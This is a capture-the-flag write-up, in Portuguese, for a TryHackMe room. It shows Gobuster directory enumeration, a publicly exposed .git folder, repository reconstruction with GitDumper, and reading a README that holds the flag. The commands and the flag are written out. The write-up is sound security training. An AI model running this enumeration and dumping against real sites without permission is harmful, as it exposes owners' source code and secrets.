# TryHackMe — Hackers Holiday CTF
## Level 2 — Room 404

**Categoria:** Web / Recon / Information Disclosure / Git Exposure
**Dificuldade:** Fácil/Média

---

### 🛎️ Concierge Briefing

> He booked the quiet room. It's not on the floor plan, not in the brochure, not on any door. But port 8080 is wide open, and the rooms it never lists are the ones worth finding.
> Welcome to the Byte Lotus, where the WiFi is open, the app is free, and the concierge already knows your coffee order. You spend these first days as a guest who simply notices things — a room that isn't on the floor plan, packets that leave every night at the same hour, a profile assembled from two breakfasts and a livestream.
> The Byte Lotus guest-experience platform went live in a hurry, and the night-shift developer shipped more than the website.

---

## 🎯 Objetivo

O briefing deixa claro o vetor: existe um serviço web na **porta 8080**, referente à plataforma de "guest-experience" do hotel, e o comentário *"the night-shift developer shipped more than the website"* sugere fortemente que **algo além do site foi publicado por engano** — um clássico indício de **repositório `.git` exposto em produção**.

---

## 🔍 Passo 1 — Reconhecimento do site

Acessando o serviço na porta 8080 do host alvo:

```
http://10.66.182.189:8080/
```

![Site institucional do Byte Lotus na porta 8080](/Hacker%20Holiday%202026%20-%20THM/2º%20Level%20-%20Room%20404/images/WebSite.png)

A página é a landing page do "Byte Lotus — Stay Notice", com seções **Rooms**, **The App**, **Concierge** e **Stay**. No rodapé, um pequeno detalhe confirma a suspeita do briefing:

> *"guest experience platform · build staging"*

A palavra **"staging"** é a primeira confirmação de que este não é necessariamente um ambiente de produção "limpo" — pode conter arquivos de desenvolvimento esquecidos.

---

## 🔍 Passo 2 — Enumeração de diretórios com Gobuster

Com o alvo identificado, foi feita uma varredura de diretórios/arquivos usando o **Gobuster**:

```bash
gobuster dir -u http://10.66.182.189:8080/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 30 --exclude-length 207
```

![Gobuster encontrando o .git exposto e GitDumper extraindo o repositório](/Hacker%20Holiday%202026%20-%20THM/2º%20Level%20-%20Room%20404/images/Gobuster_and_GitTools.png)

Resultado da varredura:

```
.git/config      (Status: 200) [Size: 92]
.git/logs/       (Status: 200) [Size: 165]
.git              (Status: 200) [Size: 437]
.git/index        (Status: 200) [Size: 289]
.git/HEAD         (Status: 200) [Size: 21]
```

**Confirmado:** a pasta **`.git`** do repositório de desenvolvimento está publicamente acessível via HTTP, na raiz da aplicação. Isso significa que todo o histórico de commits, arquivos e metadados do repositório podem ser reconstruídos remotamente — um vazamento clássico de "shipped more than the website".

---

## 🔍 Passo 3 — Extraindo o repositório com GitTools (GitDumper)

Para reconstruir o repositório a partir do `.git` exposto, foi utilizada a ferramenta **GitDumper**, parte do conjunto [GitTools](https://github.com/internetwache/GitTools):

```bash
cd Tools/GitTools/Dumper
./gitdumper.sh http://10.66.182.189:8080/.git/ repo_dump
```

O GitDumper faz o download de todos os objetos, refs e metadados possíveis do `.git` remoto, reconstruindo a estrutura localmente em `repo_dump/.git/`:

```
[+] Downloaded: HEAD
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[+] Downloaded: refs/heads/main
[+] Downloaded: logs/HEAD
[+] Downloaded: objects/0f/13550b4cb13e9f30c61d5b342c532d21e45bda
[+] Downloaded: objects/fa/45dbd69394ea9e13683d9efb6a0220daac59d4
[+] Downloaded: objects/a5/965c580fee91d852e5b19a8290da02d2926523
[+] Downloaded: objects/25/75ab073f67615a27135663ed36794c2d2584fb
...
```

(Alguns arquivos, como `objects/info/packs`, `packed-refs` e refs de `origin`, não existiam no servidor e retornaram vazios — comportamento normal, já que nem todo repositório usa pack files.)

---

## 🔍 Passo 4 — Restaurando os arquivos do repositório (`git checkout`)

Com o `.git` reconstruído localmente, o próximo passo foi restaurar a árvore de arquivos do commit mais recente:

```bash
cd repo_dump/.git
cd ..
git checkout .
```

Saída:

```
Updated 3 paths from the index
```

![Reconstrução do repositório e leitura do README com a flag](/Hacker%20Holiday%202026%20-%20THM/2º%20Level%20-%20Room%20404/images/Extrafilation_Flag.png)

Após o `checkout`, a pasta `repo_dump/` passou a conter os arquivos reais do projeto:

```
app.js  index.html  README.md
```

---

## 🔍 Passo 5 — Lendo o README.md

```bash
cat README.md
```

Conteúdo revelado:

```
# Byte Lotus — Guest Experience Platform

Internal staging repository for the guest app and concierge personalization
service. Do not deploy this folder to production.

Staging flag (remove before launch): THM{byt3_l0tus_n3v3r_f0rg3ts}
```

O README confirma exatamente o que o briefing insinuava: este era um repositório de **staging interno**, que **nunca deveria ter ido para produção** — mas foi, junto com a pasta `.git`, expondo a flag diretamente no controle de versão.

---

## 🚩 Flag

```
THM{byt3_l0tus_n3v3r_f0rg3ts}
```

---

## 📝 Resumo da cadeia de investigação

1. **Briefing** → aponta para a porta 8080 e para "algo mais" publicado além do site.
2. **Acesso ao site** (`:8080`) → confirma a existência da plataforma "guest-experience" e o rodapé revela que é um **build de staging**.
3. **Gobuster** → enumera diretórios e encontra o `.git/` exposto publicamente (config, HEAD, index, logs).
4. **GitDumper (GitTools)** → reconstrói o repositório completo a partir dos arquivos `.git` expostos via HTTP.
5. **`git checkout .`** → restaura a árvore de trabalho (`app.js`, `index.html`, `README.md`) a partir dos objetos baixados.
6. **`cat README.md`** → revela a flag deixada como nota interna de "remover antes do lançamento".

---